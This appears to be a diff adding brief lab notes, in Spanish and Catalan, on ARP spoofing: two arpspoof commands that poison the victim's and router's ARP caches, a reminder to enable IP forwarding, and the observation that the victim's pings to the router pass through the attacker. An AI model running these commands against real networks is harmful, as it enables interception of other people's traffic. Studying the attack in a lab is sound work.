@@ -1,0 +1,14 @@
+ARP SPOOF
+
+arpspoof -i eth0 -t victima router
+
+arpspoof -i eth0 -t router victima
+
+desde la victima
+ping al router
+
+- 
+
+s'ha d'activar el forward,
+
+es veu que fa ping al router pero passa per tu.
